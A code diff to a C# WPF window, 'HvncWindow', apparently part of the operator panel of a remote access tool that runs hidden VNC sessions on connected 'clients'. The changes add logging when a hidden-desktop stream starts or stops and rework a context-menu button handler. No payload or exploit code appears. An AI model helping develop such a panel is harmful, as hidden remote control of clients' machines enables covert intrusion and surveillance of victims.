@@ -146,6 +146,9 @@ public partial class HvncWindow : Window
         // HVNC apps cannot access the operator's clipboard via right-click → Paste.
         if (ChkClipboard.IsChecked != true)
             SendClipboardClear();
+
+        ServerWindow.ReportGlobalActivity("HVNC started", _clientId, "running");
+        ServerWindow.LogGlobal($"[HVNC] HVNC stream started on client {_clientId}.");
     }
 
     private void SendClipboardClear()
@@ -161,6 +164,8 @@ public partial class HvncWindow : Window
     {
         _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncStop, Data = "{}" });
         SetStreamingState(false);
+        ServerWindow.ReportGlobalActivity("HVNC stopped", _clientId, "complete");
+        ServerWindow.LogGlobal($"[HVNC] HVNC stream stopped on client {_clientId}.");
     }
 
     private void SendAck()
@@ -450,12 +455,16 @@ public partial class HvncWindow : Window
 
     private void BtnMenu_Click(object sender, RoutedEventArgs e)
     {
-        var mainWindow = Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
-        if (mainWindow == null) return;
-        var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "HvncWindow");
-        menu.PlacementTarget = (UIElement)sender;
-        menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
-        menu.IsOpen = true;
+        if (sender is System.Windows.Controls.Button btn)
+        {
+            var mainWindow = Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
+            if (mainWindow == null) return;
+            var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "HvncWindow");
+            btn.ContextMenu = menu;
+            menu.PlacementTarget = btn;
+            menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
+            menu.IsOpen = true;
+        }
     }
 
     private void TitleBar_Drag(object s, MouseButtonEventArgs e)
